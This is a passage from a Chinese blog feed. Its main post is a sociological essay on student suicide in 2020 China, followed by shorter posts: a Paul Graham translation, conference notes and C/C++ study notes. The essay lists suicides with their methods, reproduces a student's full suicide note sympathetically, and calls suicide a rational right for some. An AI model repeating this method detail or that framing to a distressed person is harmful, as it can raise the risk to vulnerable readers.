形态所塑造。抛去一切由消费构建的外衣，只有赤裸裸的金钱才被承认具有合法性，并成为整个社会所共同追逐的对象和评判个体价值的标尺。马克斯韦伯笔下的新教伦理已然成为事实上的普世价值，凡是与资本主义精神不相容的特征都被认为是一种疾病。陶潜和梭罗式的隐居只能成为幻想，只要参与社会生活，就必须接受社会的度量，哪怕只是想追求个人的小确幸，也不得不被捆绑在资本逐利的大船上，没有任何和解的余地。在这种意义上，每个被冠以奋斗之名在996的流水线上透支生命的打工人都是利他主义自杀在当代社会的牺牲品。</p><p>当今中国处于社会转型期，国内矛盾凸显，国际时局动荡，新冠疫情的突然降临更是让人恍如隔世。信息爆炸、流量为王的时代，世间一切光怪陆离的现象都能立即呈现在我们眼前，挑战着我们的观念。以前我们高喊“知识就是力量”，深信“寒门出贵子”，但后来我们发现，苦尽甘来的不是做题家，而是丁真，小丑竟是我们自己，我们不得不接受“颜值即正义”，自嘲“累就对了，幸福是留给有钱人的”。在价值失范的社会，自杀是无声的控诉。</p><p>如今，自杀率上升已经是一个摆在我们面前的问题，解决方法在哪？涂尔干认为必须从维持社会的有机团结入手，他提出了“职业群体”的制度，试图让职业群体取代家庭和宗教，发挥社会整合与调控的作用。我认为他的出发点是合理的，但他可能没有预见到百年后的世界，社会分工的细致程度大大加强了，社会的团结程度却没有提高，资本主义的确创造出了许多岗位，但职业群体却似乎无法承担整合社会成员的作用，而只是资本运作的副产品，它本身就是不稳定的，只要人无法创造经济价值，就会被无情地驱逐出这个群体，在这里仍然只有赤裸裸的利益关系。在我看来，任何将人不是作为目的，而是作为手段去连接的方式都无法维持社会的团结，因为人与人的关系已被异化，商品拜物教掩盖了真正的社会关系，它对现代社会控制之全面之隐蔽更甚于有史以来的一切宗教，不摆脱它的枷锁，任何从心理学的角度降低自杀率的尝试都是扬汤止沸。</p><p>就在我完成读书报告后不久，拼多多员工猝死事件发生，这虽然不是严格意义上的“自杀”，但无疑正是我所设想的晚期资本主义利他型自杀的典型案例，拼多多官方最初的回应也充分暴露了资本无情的嘴脸：“你们看看底层的人民，哪一个不是用命换钱，我一直不以为是资本的问题，而是这个社会的问题，这是一个用命拼的时代，你可以选择安逸的日子，但你就要选择安逸带来的后果，人是可以控制自己的努力的，我们都可以。”看似客观合理甚至显得积极正能量的回答，却是十足的伪命题。因为即使只是顺应社会现有的规则，也已经是在以加强其合法性的方式参与其中。这个荒诞的世界，是你我共谋的世界。</p><p>自杀永远不会消失，人应当拥有结束自己生命的权利，对部分人来说自杀不过是一种出于理性的选择。但这决不意味着当代社会大批量“生产”自杀的情况是合理的，当人被异化为商品，走投无路之人的自杀也就沦为了过剩商品的自我毁灭，这样的自杀并不是人自由意志的结果，而只是资本逐利的手段，是社会达尔文主义的体现，与其说这是自杀，不如说这是整个社会对个人的蓄意谋杀。与此同时，原本作为个人选择的自杀也被无孔不入的资本主义所寄生，必须将人从异化关系中解放，自杀本身也才能得到解放。</p><h2 id="做题家自杀案例分析以北交大大三跳楼学生为例"><a class="markdownIt-Anchor" href="#做题家自杀案例分析以北交大大三跳楼学生为例"></a> “做题家”自杀案例分析——以北交大大三跳楼学生为例</h2><h3 id="背景信息"><a class="markdownIt-Anchor" href="#背景信息"></a> 背景信息</h3><p>2020年是大学生自杀事件频发的一年，据网络人士不完全统计如下</p><blockquote><p>2020年05月09日 中国传媒大学动画学院研三学生跳楼自杀, 家属认为自杀原因为导师薛燕平阻挠其毕业</p><p>2020年05月23日 南通大学学生跳楼自杀，自杀原因未知</p><p>2020年06月06日 中北大学本科生跳楼自杀, 自杀原因为考试sample作弊被发现</p><p>2020年07月01日 中山大学大四毕业生跳楼自杀，自杀原因未知</p><p>2020年07月30日 于青海可可西里失联的南京航空航天大学大四女生遗骸被发现 (是否属自杀存疑)</p><p>2020年08月18日 南京航空航天大学飞行学院本科生跳楼自杀，自杀原因未知</p><p>2020年08月31日 南京航空航天大学电子信息学院本科生跳楼自杀，自述自杀原因为自身极端理想主义</p><p>2020年09月03日 内蒙古呼和浩特某高校大四女生跳楼自杀，自杀原因未知</p><p>2020年9月初 浙江大学动科院女博士生烧炭自杀，自杀原因为导师压榨</p><p>2020年9月初 上海交通大学自动化系研究生上吊自杀，自杀原因为导师龙承念压榨</p><p>2020年09月10日 浙江理工大学启新学院本科生跳楼自杀，自杀原因疑学业问题</p><p>2020年09月17日 北京交通大学土建学院大二学生跳楼自杀，自杀原因未知</p><p>2020年09月19日 南京大学女博士生跳楼自杀, 自杀原因为导师压榨</p><p>2020年09月19日 中北大学信息商务学院（独立学院）本科新生跳楼自杀, 自杀原因未知</p><p>2020年10月05日 郑州大学本科生跳楼自杀，自杀原因未知</p><p>2020年10月06日 兰州石化职业技术学院大三情侣烧炭自杀, 自杀原因为网贷负债</p><p>2020年10月09日 四川大学华西医学院研二学生跳楼自杀，自杀原因未知</p><p>2020年10月10日 南京审计大学大四学生跳楼自杀，自杀原因未知</p><p>2020年10月上旬 重庆大学学生跳楼自杀，自杀原因未知</p><p>2020年10月12日 江苏大学食品与生物工程学院本科生跳楼自杀, 校方认为自杀原因疑学习困难</p><p>2020年10月12日 华南理工大学医学院学生跳楼自杀，自杀原因未知</p><p>2020年10月13日 大连理工大学化工学院研三学生上吊自杀，自杀原因为毕业压力大，微博名“红烧土豆叶”</p><p>2020年10月14日 广东工业大学华立学院（独立学院）本科生跳楼自杀，自杀原因未知</p><p>2020年10月19日 成都理工大学地质系大一学生于东风渠校内桥梁处失踪，自述找不到生命的意义</p><p>2020年10月22日 北京师范大学博士生跳楼自杀, 自杀原因未知</p><p>2020年10月24日 中南财经政法大学本科生自杀, 自杀原因未知</p><p>2020年10月26日 郑州商学院电气专业大三女生跳楼自杀，自杀原因未知</p><p>2020年10月27日 北京理工大学研三学生跳楼自杀，自杀原因未知</p><p>2020年11月02日 湖南师范大学商学院本科生上吊自杀, 家属认为自杀原因为学工老师肖鹏压榨</p><p>2020年11月05日 合肥工业大学机械学院大二学生跳楼自杀，自杀原因未知</p><p>2020年11月11日 三峡大学本科生跳楼自杀，自杀原因未知</p><p>2020年11月11日 台湾大学陆籍研究生自杀，自杀原因为长期失眠</p><p>2020年11月14日 浙江理工大学政法系学生上吊自杀，自杀原因未知</p><p><strong>2020年11月16日 上海大学数学系大二女生跳楼自杀，自杀原因未知</strong></p><p>2020年11月18日 内蒙古呼和浩特某学院一男学生跳楼自杀，自杀原因未知</p><p>2020年11月18日 上海交通大学密歇根学院学生跳楼自杀，抢救数日后死亡，自杀原因未知</p><p>2020年11月19日 武汉工程大学学生跳楼自杀，自述“自己太笨了、太累了”，B站名“琉科Ryuko”</p><p>2020年11月20日 中山大学公共卫生学院（深圳）毕业年级研究生服药自杀，自杀原因未知</p><p>2020年11月22日 达州职业技术学院大二女生跳楼自杀，自杀原因未知</p><p>2020年11月25日 石家庄铁道大学本科生跳楼自杀，自杀原因未知</p><p>2020年11月25日 四川农业大学学生跳楼自杀，自杀原因未知</p><p>2020年11月28日 中山大学研究生跳楼自杀，自杀原因未知</p><p>2020年11月30日 河南牧业经济学院学生跳楼自杀，自杀原因未知</p><p>2020年12月03日 河南财经政法大学大二女生跳楼自杀，自杀原因未知</p><p>2020年12月03日 湖南第一师范学院外国语学院大四女生上吊自杀，自杀原因未知</p><p>2020年12月04日 南京大学学生烧炭自杀，重度烧伤，现抢救中</p><p>2020年12月05日 西北工业大学本科生跳楼自杀，自杀原因未知</p><p>2020年12月05日 黑龙江科技大学建工学院学生跳楼自杀，自杀原因未知</p><p>2020年12月06日 黑龙江科技大学女生上吊自杀，自杀原因未知</p><p>2020年12月07日 黑龙江科技大学计算机学院学生跳楼自杀，自杀原因未知</p><p>2020年12月08日 广东药科大学卫检专业大二学生于广州大学城新洲村新洲河堤处失踪，12月16日确认离世</p><p>2020年12月13日 安徽师范大学学生跳楼自杀，自杀原因未知</p><p>2020年12月13日 吉林大学莱姆顿学院学生跳楼自杀，自杀原因未知</p><p><strong>2020年12月15日 北京交通大学机电学院大三学生跳楼自杀，自杀原因为“为追求‘全面发展’而舍弃了自身唯一的‘做题’优势，后来’意识到问题所在时，为时已晚’”</strong></p><p>2020年12月16日 吉林大学莱姆顿学院学生服药自杀，自杀原因未知</p></blockquote><p>从以上数据中，可以看出此类自杀事件具有以下特征：</p><ol><li>自杀者多为理工科专业学生，男女均有，全国各地各层次高校均有分布</li><li>自杀方式多为跳楼，也有上吊、烧炭、失踪</li><li>存在同一高校出现连续多人自杀的情况</li><li>自杀原因若能明确则多为学业压力和理想破灭，研究生自杀多与导师有关</li></ol><p>由于数据统计上的偏差，以上判断仅为个人分析结果，不具备较强的严谨性。但大致可以看出这类自杀现象已不是几个特例，而成为一种典型，可以称之为“做题家”的自杀。由于自杀者的个人信息不便公开，相关资料严重缺乏，下面就其中一位自杀者留下的长篇遗书进行分析，以窥见整个自杀群体的共同心声。</p><h3 id="文字材料当事人遗书"><a class="markdownIt-Anchor" href="#文字材料当事人遗书"></a> 文字材料—当事人遗书</h3><blockquote><p>“再见，各位我所熟识的，或是陌生的人们。<br />如果你们看到了这段文字，那就说明，我以自己的意志，经过深思熟虑，选择了毁灭自己，这无关任何人，和学校，和辅导员没有任何关系，和我的同学，或是我熟识的人更没有任何关系，希望我的室友或是什么和我关系亲密的人不要借此去闹事。如果你们因此而获得了保研的资格，或是别的什么更大的利益，那对于我们身边那些少说奋斗了三年，多说奋斗了二十年的同学或是同胞不公平。另外，如果你们真的白嫖了三个保研名额的话——为什么不是五个呢？我觉得咱们寝室确实有两个人值得——你们就得给我立个牌位供起来，明白？<br />我不会试图塑造一个完美的死者形象，那样的形象只能给人一种“我的自杀是一幕毁灭了某种美好事物的悲剧”的印象，只有把一个千疮百孔，扭曲至极的我展现出来，才能让你们体会到选择毁灭的必要性——然而我并不能将这样的自己完全展示出来，因为在写下这段又臭又长的文字的同时，我那些扭曲的，疯狂的，淫猥的想法已经随着我的毁灭一起，埋葬在我的脑海中。<br />二十年来我坚信做题是唯一出人头地的途径，我因此放弃了其他的方向，使得做题成为我唯一而且是最为突出的优势，并且相信这是唯一的正途。到了大学之后，我竟然听信了某些自由派的鬼话，妄图“全面发展”，因而舍弃了做题这一优势项目。当我意识到问题所在时，为时已晚。这不啻于我的“戈尔巴乔夫改革”，摧毁了我的根基。接下来呢？生活无望，希望崩塌，对明天的期待已经毁灭殆尽，没有了信念和理想。很多美好的事物都毁在这一点上。因为没有了信念，斯大林格勒的62集团军的红军战士们最后退化成了阿富汗战争里的炮灰；的黎波里海岸上的美国海军陆战队变成了PTSD集中营。至于我，失去信念和理想之后就是今天的结局——“苏联解体”。<br />然后呢？现在的我不知道未来是什么，不知道我想要什么。灵魂的惯性迫使我沿着原有的轨迹前进，而我的灵魂早就没有了一分再向前推进的力气，支撑着我一步一步走下去的只有我对于别人的承诺，这一天的到来是我的决定，不再履行对别人承诺的决定。我被自己失去动力的灵魂拖着前进，今天它的动量在阻力的长久影响下消耗殆尽了，而我也就决定要离开这个世界。毕竟这样活着也没什么意思，一边把自己伪装的上进阳光而且乐观，一边又在别人看不到的角落里释放自己最阴暗的一面。我不再是之前那样的纯粹的一层，和吴法宪，张铁生之流已经没有区别。<br />我曾经痛恨过很多东西，资本家，白匪军，官僚，保守主义的老棺材瓤子以及它们的走狗们。但是我已经等不到亲手消灭它们的那一天了，同志们，请代替我完成这个任务，拜托了。<br />好了，和所有人要说的话说完了，接下来我要给一些对我而言很重要的人单独留下一些话。我希望你们能确保下面的话只有他们自己能看见，毕竟在没有特定语境的情况下，我对一个人说的话多半会被误解成另一个意思，这是我动身前最后一个愿望——学校的话，不必去查找那些信件了，那里面没有你们想知道的东西，只有一些我不想让别人知道的东西，其中并不包括我为什么要这么做，因为这个问题的答案在上面已经很明确了。<br />最后——尽管叶赛宁的诗据说被网易云用户给玩烂了，不过我觉得用叶赛宁辞世之前在列宁格勒的旅馆里用自己的血写下的绝笔作为我对世界的告别还是挺合适的：<br />再见吧，我的朋友，再见<br />亲爱的，你永在我的心间。<br />命中注定要相互离别，<br />许诺我们在前方相见<br />再见，朋友，不必悲伤，<br />也没有必要愁容满面。<br />人世间死已不是新鲜事。<br />而活着，也不见得，更为新鲜。”</p></blockquote><h3 id="案例解读"><a class="markdownIt-Anchor" href="#案例解读"></a> 案例解读</h3><p>当事人的遗书较长，且运用了较多修辞，为便于理解我按顺序将其拆解为以下几个部分：</p><ol><li>预先替他人开脱责任；呼吁熟人不要借此闹事而从中牟利；为自己的自杀行为定性——经过了慎重考虑但不是完美纯洁的受害者而是扭曲后必然的毁灭</li><li>阐述自己的心路历程：进大学前一心“做题”—听信“自由派”妄图全面发展—发现丧失“做题”能力后失去信念希望崩塌</li><li>倾诉自己失去动力后强颜生活的麻木和内心的自闭阴暗</li><li>表达自己对部分社会成员的痛恨，希望后来人最终消灭之</li><li>对一些重要的人单独留话，让学校不必白费工夫从信件里查找自杀原因</li><li>最后以叶赛宁的绝笔诗向世界告别</li></ol><p>尽管资料有限，但仅从当事人的遗书中，已经可以发现许多。他应该是一个温柔善良的人，处处替他人考虑，也为学校着想，对历史典故甚至是一些较为禁忌的人物生平都知之甚多，还能恰到好处地引用外国诗人的诗，人文素养不差。全文饱含浓烈情感而又娓娓道来，并无激烈言语发泄愤怒，惟有平静叙述宣告心死，相信读者无论是否有相同的经历，都会为之动容。</p><p>但就是这样一个对世界充满善意的大学生，为何早早地而且是“经过深思熟虑”后选择了自我毁灭？</p><p>正如他自己所说，“问题的答案在上面已经很明确了”，第3部分他的心路历程说明了一切。简言之就是，“做题家”尝试改变自我走进新天地，到头来却发现丢失了自己的基本盘，最终丧失信念。</p><p>“做题家”“内卷”这些词汇已经十分流行，之前同样地处北京的某高校曾有传闻称学生熬夜学习猝死，尽管事后当事人澄清只是一时昏迷并无生命危险，但足以说明大学生内卷过度以至于损害身体健康是多么普遍。不过北交大这位学生的案例在典型的同时又有其特别之处，便是他曾经“听信自由派的鬼话”，有过一段尝试“全面发展”的时期，这是将他与其他“做题家”区分开来的地方，但尝试的结局却又证明了他终究不可能和“做题家”分道扬镳，因为他终于认识到了作为没有资源没有背景的普通大学生，追随“自由派”去“全面发展”并不能带来收益，反而削弱了他唯一可以依靠的硬实力，或许是绩点、科研、竞赛，我们无从得知。但压垮他的并不是这些筹码本身，他本可以重新加入“做题家”的行列努力扳回一城，然而他没有，他倦了，他的信念已然崩塌。他放下笔去做一个“自由派”时越轻盈越愉快，他就越没有勇气越不愿捡起笔再去做题，纵然那是一场梦，也不愿醒来。</p><p>但在某种程度上，他又是幸运的。他可能以为如果没有“自由派”的蛊惑，如果他的“做题”根基依然牢固，他就能继续在正途上前进，也许就能凭着过硬的绩点保研到理想的学校，赢得光明的前景。但众多研究生自杀的案例摆在眼前，其中不乏来自名牌高校者，他们其实就是北交大学生的另一种结局，是的，仍然是自杀的结局，只不过多了几年煎熬岁月，多了一层痛苦领悟，最终他们会发现，原来“做题”也只是一条看不到终点的道路，原来没有摩西的手杖就不能让湍流变坦途。</p><p>我们都在玩着一个没有赢家的游戏，无论是中途体力透支倒下，还是技不如人自刎而亡，或是取得了阶段性的胜利，最终却都走向了自杀的道路，这究竟是为什么？我想出问题的是游戏本身，我们已经忍受了野蛮的规则，为之展开了激烈的竞争，到头来又被告知另有一套评分体系，那之前的努力意义何在？一旦产生这种疑问，自杀就在招手了。</p><h3 id="结语"><a class="markdownIt-Anchor" href="#结语"></a> 结语</h3><p>通过对大学生自杀案例的分析，我希望淡化对自杀者本身性格缺陷的放大和谴责，而关注自杀群体的共性特征，追问大学生自杀现象频繁出现的病灶，但愿这个世界多一点关怀和公正。真的猛士，自会奋然前行，如何能让苟活者在淡红的血色中，依稀看见微茫的希望，更是我们要思考的问题。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Early Work</title>
    <link href="/2020/12/16/Early-Work/"/>
    <url>/2020/12/16/Early-Work/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.paulgraham.com/early.html">原文 : Early Work</a></p><p>Author : Paul Gramham</p><p>October 2020</p><p>阻碍人们做伟大工作的最大原因之一，就是担心做出蹩脚的东西，这并非杞人忧天。许多伟大的项目在早期都会经历一个阶段，在那时，它们看起来并不令人印象深刻，甚至对它们的创作者自己来说也是如此。你必须挺过这个阶段，才能触及之后的伟大事业，但很多人无法做到。大多数人甚至没有达到做一些他们感到尴尬的东西的阶段，更不用说继续过去了。他们惶恐过甚以至于不敢开始。</p><p>想象一下，如果我们能不再恐惧做出蹩脚的东西，我们能做得更多！</p><p>我们有希望遏制这种恐惧吗？我想答案是肯定的。我认为这种习惯并不是根深蒂固的。</p><p>对我们人类来说，发明新东西本身就是一件新鲜事。它一直都在发生，但直到过去的几个世纪，它发生得非常缓慢，以至于人类个体都看不见。而且既然我们不需要处理新想法，所以我们没有养成任何处理新想法的习俗。</p><p>我们只是对鸿篇巨制的早期版本没有足够的经验，不知道如何应对它们。我们对它们的评判就像我们评判更加成熟的作品，或者不那么有野心的项目一样。我们并未意识到它们是一种特殊案例。</p><p>或者至少，是我们大多数人没有意识到。让我相信我们可以做得更好的一个原因是，它已经开始发生了。已经有一些地方在这方面活在未来。硅谷就是其中之一：一个不知名的人在研究一个听起来奇怪的想法，不会像在他们家里那样自动被驳回。在硅谷，人们已经了解到这是多么危险的事情。</p><p>处理新想法的正确方法是把它们当作是对你想象力的挑战——不仅是降低标准，而是完全转换极性 (switch polarity)，从罗列一个想法行不通的原因到尝试思考它可以行得通的方法。当我遇到有新想法的人时，我就会这么做。我已经变得相当擅长，但我已经有了大量实践。作为Y Combinator的合伙人，意味着几乎要沉浸在陌生人提出的奇谈怪论中。每隔半年，你的手上就会有成千上万个新想法，不得不对它们进行分类，因为你知道，在一个结果呈幂律分布的世界里，如果你错过了大海里的那一根针，那将是非常痛苦的。乐观由此变得迫切。</p><p>但我希望，假以时日，这种乐观主义能普及到足以成为一种社会习惯，而不仅仅是少数专家使用的伎俩。这毕竟是一个极其赚钱的把戏，而且这些把戏往往会迅速传播。</p><p>当然，经验不足并不是人们对雄心勃勃的项目的早期版本过于苛刻的唯一原因，他们这样做也是为了显得自己很聪明。而且在像创业公司这样的领域，新想法往往是冒险的，那些否定它们的人其实更有可能是对的。只是当他们的预测以结果来衡量时，就不一样了。</p><p>但人们否定新想法还有一个更险恶的原因。如果你尝试一些雄心勃勃的东西，你身边的很多人会有意无意地希望你会失败。他们担心，如果你尝试一些雄心勃勃的东西并取得成功，就会让你凌驾于他们之上。在一些国家，这不仅仅是个人的失败，而是民族文化的一部分。</p><p>我不会说硅谷的人克服了这些冲动，因为他们在道德上更好。1]很多人希望你成功的原因是，他们希望和你一起崛起。对于投资人来说，这种激励特别明确。他们希望你成功，因为他们希望你能在这个过程中让他们发财。但是，你遇到的许多其他人也可以希望从你的成功中获得某种利益。至少在你出名的时候，他们能够说，他们从很久以前就认识你了。</p><p>但即使硅谷的鼓励态度是源于自身利益，但随着时间的推移，它实际上已经发展成为一种仁慈。鼓励创业公司已经实践了很久，以至于已经成为一种习惯。现在看来，对创业公司就是这么做的。</p><p>也许是硅谷太乐观了。也许是太容易被冒牌货骗了。很多不太乐观的记者都想相信这一点。但他们所列举的冒牌货名单却短得令人怀疑，而且充满了星号。如果用收入作为检验标准，硅谷的乐观主义似乎比世界其他地方的乐观主义调得更好。因为它有效，所以会传播。</p><p>当然，新的想法比新的创业想法要多得多。对做出蹩脚东西的恐惧让人们在每个领域都退缩了。但硅谷表明，风俗是如何迅速发展以支持新想法的。而这也反过来证明，否定新想法并不是根深蒂固的人性，以至于不能不学。</p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDG Shanghai DevFest2020</title>
    <link href="/2020/11/20/DevFest2020/"/>
    <url>/2020/11/20/DevFest2020/</url>
    
    <content type="html"><![CDATA[<h3 id="概念扫盲"><a class="markdownIt-Anchor" href="#概念扫盲"></a> 概念扫盲</h3><h4 id="hamming分类器"><a class="markdownIt-Anchor" href="#hamming分类器"></a> Hamming分类器</h4><p>multishot</p><h4 id="jaxtensorflow简化库"><a class="markdownIt-Anchor" href="#jaxtensorflow简化库"></a> JAX:TensorFlow简化库</h4><h4 id="自定义keras-layer"><a class="markdownIt-Anchor" href="#自定义keras-layer"></a> 自定义Keras Layer</h4><h4 id="milvus快速构建ai应用"><a class="markdownIt-Anchor" href="#milvus快速构建ai应用"></a> Milvus快速构建AI应用</h4><h4 id="后疫情时代的音频体验"><a class="markdownIt-Anchor" href="#后疫情时代的音频体验"></a> 后疫情时代的音频体验</h4><p>质量敏感</p><ul><li>噪声</li><li>啸叫</li><li>回声</li><li>开关</li></ul><p>实时美声</p><ul><li>声学</li><li>心理学</li><li>语言学</li></ul><h3 id="rosettaai密码学"><a class="markdownIt-Anchor" href="#rosettaai密码学"></a> Rosetta：AI+密码学</h3><p><a href="https://zhuanlan.zhihu.com/p/306302226">投稿文章</a></p><p>矛盾：数据多样性和隐私性</p><h4 id="隐私计算privacy-preserving-computation"><a class="markdownIt-Anchor" href="#隐私计算privacy-preserving-computation"></a> 隐私计算(Privacy-Preserving Computation)</h4><p>三种技术方向</p><ul><li>可信执行环境(TEE)</li><li>联邦学习(Federated Learning)</li><li>密码学</li></ul><h4 id="密码学"><a class="markdownIt-Anchor" href="#密码学"></a> 密码学</h4><ul><li>安全多方计算Secure Multi-Party Computation<ul><li>百万富翁问题</li><li>secret sharing基本思想：计算过程中所有中间值都是公开的</li></ul></li><li>同态加密Homomorphic Encryption<ul><li>在密文操作下能对明文进行f操作，f可是任何方式</li><li>爱丽丝的珠宝</li></ul></li><li>零知识证明Zero-Knowledge Proof<ul><li>阿里巴巴洞穴</li></ul></li></ul><p>密码学主要解决常规逻辑下看似不可能的事</p>]]></content>
    
    
    <categories>
      
      <category>记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>活动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CPPP</title>
    <link href="/2020/11/19/CPPP/"/>
    <url>/2020/11/19/CPPP/</url>
    
    <content type="html"><![CDATA[<h3 id="pointers-to-functions"><a class="markdownIt-Anchor" href="#pointers-to-functions"></a> Pointers to Functions</h3><p>eg. <code>bool (*pf)(const string &amp;, const string &amp;);//uninitialized</code></p><h2 id="const"><a class="markdownIt-Anchor" href="#const"></a> const</h2><ul><li>Top-level const: indicate that the pointer itself is a const. Top-level const can appear in any <strong>object type</strong>(Reference NO!), i.e., one of the built-in arithmetic types, a class type, or a pointer type.</li><li>Low-level const: a pointer that points to a const object. Low-level const appears in the base type of compound types such as <strong>pointers</strong> or <strong>references</strong>.</li></ul><p>Note : Pointer types can have both top-level and low-level const independently. Reference types only have low-level const because they are just aliases.</p><p>The distinction between top-level and low-level matters when we copy an object. <strong>When we copy an object, top-level consts are ignored, but low-level const is never ignored.</strong></p><p><strong>Address of a const object is a low-level const.</strong></p><h2 id="class"><a class="markdownIt-Anchor" href="#class"></a> Class</h2><h3 id="constructors"><a class="markdownIt-Anchor" href="#constructors"></a> Constructors</h3><p>The compiler generates a default constructer automatically only if a class declares no constructors.</p><p><code>A() = default;</code> do exactly the same work as the synthesized default constructor.<br />The default constructor works only because we provide initializers for data members with built-in type.<br />If your compiler does not support in-class initializers, <strong>constructor initializer list</strong> should be used to initialize members of the class.</p><p>use <code>explicit</code>to avoid behind-the-scene type conversions</p><h3 id="virtual-functions"><a class="markdownIt-Anchor" href="#virtual-functions"></a> Virtual Functions</h3><p>dynamic binding(run-time binding)</p><h2 id="c11"><a class="markdownIt-Anchor" href="#c11"></a> C++11</h2><h3 id="auto"><a class="markdownIt-Anchor" href="#auto"></a> auto</h3><ul><li><strong>When we use a reference, we are really using the object to which the reference refers</strong></li><li><em>auto</em> ordinarily ignores top-level const</li></ul><h3 id="decltype"><a class="markdownIt-Anchor" href="#decltype"></a> decltype</h3><p>Type specifier that deduces the type of its operand, which is an expression to be analyzed by compiler, but not evaluated.</p><p><strong>Remember that decltype((variable)) (note, double parentheses) is always a reference type, but decltype(variable) is a reference type only if variable is a reference.</strong></p><p>Note : <code>decltype(*p)</code> return type of <code>int&amp;</code>, not <code>int</code>.That is easy to understand but also easy to forget.<br />It is worth noting that <code>decltype</code> is the <em>only context</em> in which a reference is not treated as a synonym for the object to which it refers.</p><h3 id="type-alias"><a class="markdownIt-Anchor" href="#type-alias"></a> type alias</h3><p>eg. <code>using pos=std::string::size_type;</code></p><h3 id="range-for"><a class="markdownIt-Anchor" href="#range-for"></a> range for</h3><p><code>for (declaration : expression) statement</code></p><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> c <span class="token operator">:</span> str<span class="token punctuation">)</span>  <span class="token comment">// just copy!</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>c <span class="token operator">:</span> str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h3 id="final"><a class="markdownIt-Anchor" href="#final"></a> final</h3><h3 id="override"><a class="markdownIt-Anchor" href="#override"></a> override</h3><p>used in function of derived class</p><h3 id="list-initialization"><a class="markdownIt-Anchor" href="#list-initialization"></a> list initialization</h3><p>the idea of uniform initialization</p><h3 id="rvalue-refeence"><a class="markdownIt-Anchor" href="#rvalue-refeence"></a> rvalue refeence</h3>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C指针复盘</title>
    <link href="/2020/11/03/C-Pointer/"/>
    <url>/2020/11/03/C-Pointer/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>指针是学习C语言时无法绕过的概念，但由于其在算法竞赛中绝少使用，导致本人对指针的理解仍有许多模糊之处，学习Python、JavaScript等编程语言时，也从未遇到过指针，只有对象、引用这些更为抽象的概念。而要深入理解指针的本质和意义，必须对计算机内存模型和寻址方式先作了解，这无疑又得费番工夫。水平所限，本文无法对C的指针给出精妙的见解，仅是尝试帮助大一新生更好地准备考试，若文中出现错误，还望尽快指出。若要严谨地讨论C语言，得求教SSS学长。</p><p>约定本文中出现的<code>p</code>均表示指针变量，<code>a</code>表示数组名，其他字母(如<code>x</code>,<code>y</code>一律假设为<code>int</code>型变量。</p><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><blockquote><p>指针（pointer）是一个值为内存地址的变量（或数据对象）</p></blockquote><p>分析主谓宾，将原句拆成两句话即</p><ul><li>指针是一个变量</li><li>指针的值是内存地址</li></ul><p>“变量”这一概念，学习过C语言基本数据类型使用的人都不会陌生，既然是变量，那么有声明、赋值等一系列常规操作，概念在书上讲得更为系统，这里就从略，只重点介绍一下<code>*</code>和<code>&amp;</code>这两个初学者容易混淆的运算符。</p><p>在C语言中，同一个符号可以承载多种含义，需要根据前后所操作变量的个数和类型来判断。</p><p><code>&amp;</code>，学到现在可以看到两种形态</p><ul><li>按位与运算符<code>x&amp;y</code>，对数字的二进制形式进行按位与操作，认识即可。</li><li>取地址运算符(<code>&amp;x</code>)，后面跟着一个变量，作用是取出该变量在内存中的地址。<ul><li><code>printf()</code>输出时格式化字符为<code>%p</code></li><li>但是不能直接对<code>&amp;x</code>赋值，因为<code>&amp;x</code>只是临时的数据，而不是<em>左值</em>，所以需要请出指针</li></ul></li><li>其实在C++中还有<em>引用</em>这一形态，这里略去不讲</li></ul><p><code>*</code>，学到现在可以看到三种形态</p><ul><li>乘法运算符(<code>x*y</code>)：最初的形态，就是将前后两个数相乘，很容易看出它是二元操作符，需要两个操作对象，而下面两种用法都只跟着一个变量。</li><li>解引用运算符(<code>*p</code>)：又叫间接运算符，后面跟着一个指针(由于单从变量的名字上看不出它是不是指针，所以可能容易迷惑)，作用是给出指针所指向地址上的值，比如指针<code>p</code>的值是变量<code>x</code>的地址(即<code>&amp;x</code>)，那<code>*p</code>就是<code>x</code><ul><li>大概可以理解成取地址运算符的逆运算</li><li>但<code>*p</code>是<em>左值</em>，可以被赋值；而<code>&amp;x</code>不是<em>左值</em>，不可被赋值</li></ul></li><li>声明指针(<code>int * p = &amp;x;</code>)：前面接着数据类型(如<code>int</code>,<code>double</code>，后面跟着指针的名字。注意这是在<strong>声明</strong>一个指针变量，不要和上面的解引用运算符混淆。<ul><li><code>*</code>本身不是指针名的一部分</li><li><code>*</code>前的数据类型是指针所指变量的类型</li><li><code>*</code>和指针名之间的空格可有可无。通常，程序员在声明时使用空格，在解引用变量时省略空格。<ul><li>实际经过尝试在现代编译器下，<code>*</code>前后有无空格都能编译通过。一行只定义一个指针变量时，一般也不会造成误解。但考试给的代码中会出现一行中同时声明指针变量和其他变量的情况，需要注意只有<code>*</code>跟着的变量才是指针。</li><li>所以遇到题目的代码里声明指针时，<code>*</code>后紧贴指针名也正常，要能辨认出。</li></ul></li></ul></li></ul><p>运算符的优先级：<code>()</code>&gt;<code>[]</code>&gt;<code>*</code></p><p>区分：“指针的类型”和“指针所指向的类型”</p><ul><li>指针的类型：把指针名(不含<code>*</code>)去掉，剩下部分就是指针的类型</li><li>指针所指向的类型：把指针名和它左边的<code>*</code>去掉，剩下部分就是指针所指向的类型</li></ul><p>若觉赘述太多，陷入了概念的迷宫，也不想花太多时间在指针上，可以强记以下形式：声明(定义、初始化)变量时<code>int * p = 